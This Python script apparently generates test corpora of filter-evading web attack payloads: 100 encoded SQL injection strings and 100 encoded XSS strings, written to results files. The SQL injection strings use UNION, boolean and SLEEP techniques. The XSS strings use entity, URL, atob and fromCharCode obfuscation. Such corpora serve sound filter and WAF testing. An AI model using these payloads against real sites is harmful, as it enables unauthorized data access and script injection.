#!/usr/bin/env python3
from __future__ import annotations

import base64
from pathlib import Path
import random

ROOT = Path(__file__).resolve().parents[2]
RESULTS = ROOT / "results"


def gen_sqli_encoded(n: int = 100) -> list[str]:
    random.seed(42)
    out: list[str] = []

    # URL-encoded (single/double) boolean/time-based
    url_variants = [
        "1'%20OR%201%3D1--%20",
        "1'%20OR%20SLEEP(2)--%20",
        "%25271%2527%2520OR%25201%253D1--%2520",
    ]
    out.extend(url_variants)

    # Hex literal comparisons / concatenations
    out.extend([
        "1' OR 0x31=0x31-- -",
        "1' OR 0x3131=0x3131-- -",
        "1' UNION SELECT 0x61646d696e,@@version#",
    ])

    # CHAR() and CONCAT() tricks
    out.extend([
        "1' OR CHAR(49)=CHAR(49)-- -",
        "1' UNION SELECT NULL,CONCAT(CHAR(64,64),'ver',CHAR(115,105,111,110))-- -",
        "1' OR CONCAT(CHAR(49),CHAR(61),CHAR(49))-- -",
    ])

    # Versioned comments + keyword splitting
    out.extend([
        "1' /*!50000UNION*/ SELECT NULL,NULL-- -",
        "1'/**/UN/**/ION/**/SEL/**/ECT/**/NULL,USER()-- -",
        "1'/**/oR/**/1=1-- -",
    ])

    # ORDER BY with mixed encoding/casing
    for k in range(10, 40):
        out.append(f"ORDER/**/BY {k}#")
        if len(out) >= k:  # just to vary
            out.append(f"OrDeR/**/By {k}#")

    # Partial HTML entity/URL mixing
    out.extend([
        "1' OR%09%31=%31-- -",
        "1' OR 1=1 /*%0a*/ -- -",
        "1' OR 1 like 1-- -",
    ])

    # UNION 2 columns with functions
    fns = ["NULL", "USER()", "DATABASE()", "VERSION()", "@@version"]
    for _ in range(30):
        fn = random.choice(fns)
        out.append(f"1' /**/UNION/**/SELECT/**/NULL,{fn}-- -")

    # Trim / pad
    out = [p for p in out if p.strip()]
    # Pad with simple mutations to reach n
    # Ensure size n by adding ORDER BY and boolean fillers if needed
    while len(out) < n:
        k = random.randint(10, 60)
        choice = random.choice([0,1,2])
        if choice == 0:
            out.append(f"ORDER/**/BY {k}#")
        elif choice == 1:
            out.append(f"1'/**/OR/**/{k}={k}-- -")
        else:
            out.append(f"1' /**/UNION/**/SELECT/**/NULL,@@version#")
    return out[:n]


def gen_xss_encoded(n: int = 100) -> list[str]:
    random.seed(123)
    out: list[str] = []

    # HTML entity encodings
    out.extend([
        "&#60;svg onload=alert(1)&#62;",
        "<svg onload=al&#x65;rt(1)>",
        "<img src=x onerror=al&#101;rt(1)>",
    ])

    # URL-encoded
    out.extend([
        "%3Csvg%20onload%3Dalert(1)%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    ])

    # atob/constructor/String.fromCharCode
    b = base64.b64encode(b"alert(1)").decode()
    out.extend([
        f"<img src=x onerror=eval(atob('{b}'))>",
        "<svg onload=String.fromCharCode(97,108,101,114,116)(1)>",
        "<svg onload=top['al'+'ert'](1)>",
    ])

    # CSS/animation/event
    out.extend([
        "<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ])

    # srcdoc iframe with encoded script
    out.extend([
        "<iframe srcdoc='&#60;script&#62;parent.alert(1)&#60;/script&#62;'>",
        "<iframe srcdoc='%3Cscript%3Eparent.alert(1)%3C/script%3E'>",
    ])

    # Unicode / homoglyph (best-effort simple):
    out.extend([
        "<sVg oNloAd=alert(1)>",
        "<svg/onload=alert`1`>",
    ])

    # Pad with variations
    seeds = out[:]
    while len(out) < n:
        s = random.choice(seeds)
        # simple whitespace/case variations
        s2 = s.replace("onload", "onLoad").replace("onerror", "onError")
        out.append(s2)
    return out[:n]


def main() -> None:
    RESULTS.mkdir(parents=True, exist_ok=True)
    sqli = gen_sqli_encoded(100)
    xss = gen_xss_encoded(100)
    (RESULTS / "sqli_batch_encoded.txt").write_text("\n".join(sqli), encoding="utf-8")
    (RESULTS / "xss_batch_encoded.txt").write_text("\n".join(xss), encoding="utf-8")
    print(f"WROTE {len(sqli)} SQLi -> results/sqli_batch_encoded.txt")
    print(f"WROTE {len(xss)} XSS  -> results/xss_batch_encoded.txt")


if __name__ == "__main__":
    main()
